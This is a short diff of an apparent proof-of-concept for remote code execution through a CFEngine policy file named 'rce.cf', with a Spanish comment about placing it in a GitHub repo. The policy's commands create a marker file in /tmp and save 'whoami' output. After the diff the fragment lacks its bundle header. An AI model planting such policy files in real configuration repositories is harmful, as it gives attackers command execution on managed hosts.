@@ -1,7 +1,5 @@
-# En tu repo de GitHub, crea un archivo 'rce.cf':
-echo 'bundle agent main
 {
   commands:
     "/bin/touch /tmp/rce_success_$(sys.host)";
     "/usr/bin/whoami > /tmp/whoami_output";
-}' > rce.cf
+}
